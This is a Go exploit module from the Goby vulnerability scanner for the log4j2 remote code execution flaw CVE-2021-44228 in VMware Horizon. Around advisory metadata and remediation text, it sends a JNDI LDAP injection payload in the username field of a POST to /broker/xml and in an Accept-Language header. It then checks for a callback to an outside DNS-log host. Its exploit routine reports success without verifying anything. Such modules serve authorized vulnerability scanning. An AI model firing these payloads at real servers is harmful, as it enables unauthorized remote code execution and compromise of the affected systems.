package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "VMware Horizon log4j2 RCE (CVE-2021-44228)",
    "Description": "<p>Various VMware products such as VMware Horizon, VMware vCenter Server, VMware HCX, VMware NSX-T Data Center, etc. are affected by the remote code execution vulnerability CVE-2021-44228.</p><p>Attackers can use the vulnerability CVE-2021-44228 to cause remote code execution and control server permissions.</p>",
    "Impact": "VMware Horizon log4j2 RCE (CVE-2021-44228)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0028.html\">https://www.vmware.com/security/advisories/VMSA-2021-0028.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "VMware",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "VMware Horizon存在 log4j2 远程代码执行漏洞 (CVE-2021-44228)",
            "Description": "<p>VMware 多款产品 VMware Horizon、VMware vCenter Server、VMware HCX、VMware NSX-T Data Center等受远程代码执行漏洞CVE-2021-44228影响。</p><p>攻击者可利用漏洞CVE-2021-44228造成远程代码执行，控制服务器权限。</p>",
            "Impact": "<p>攻击者可利用漏洞CVE-2021-44228造成远程代码执行，控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0028.html\">https://www.vmware.com/security/advisories/VMSA-2021-0028.html</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "VMware",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "VMware Horizon log4j2 RCE (CVE-2021-44228)",
            "Description": "<p>Various VMware products such as VMware Horizon, VMware vCenter Server, VMware HCX, VMware NSX-T Data Center, etc. are affected by the remote code execution vulnerability CVE-2021-44228.</p><p>Attackers can use the vulnerability CVE-2021-44228 to cause remote code execution and control server permissions.</p>",
            "Impact": "VMware Horizon log4j2 RCE (CVE-2021-44228)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0028.html\">https://www.vmware.com/security/advisories/VMSA-2021-0028.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "VMware",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "body=\"VMware Horizon\"",
    "GobyQuery": "body=\"VMware Horizon\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.vmware.com",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://www.vmware.com/security/advisories/VMSA-2021-0028.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "${jndi:ldap://${hostName}.xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10244"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			uri2 := "/broker/xml"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg2.Data = fmt.Sprintf("<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>securid-passcode</name><params><param><name>username</name><values><value>%s</value></values></param><param><name>passcode</name><values><value>12321</value></values></param></params></screen></do-submit-authentication></broker>", cmd)
			httpclient.DoHttpRequest(u, cfg2)
			uri3 := "/portal/webclient/index.html"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.FollowRedirect = false
			cfg3.Header.Store("Accept-Language", cmd)
			httpclient.DoHttpRequest(u, cfg3)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			uri2 := "/broker/xml"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg2.Data = fmt.Sprintf("<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>securid-passcode</name><params><param><name>username</name><values><value>%s</value></values></param><param><name>passcode</name><values><value>12321</value></values></param></params></screen></do-submit-authentication></broker>", cmd)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			uri3 := "/portal/webclient/index.html"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.FollowRedirect = false
			cfg3.Header.Store("Accept-Language", cmd)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg3)
			expResult.Output = "see your dnslog"
			expResult.Success = true
			return expResult
		},
	))
}
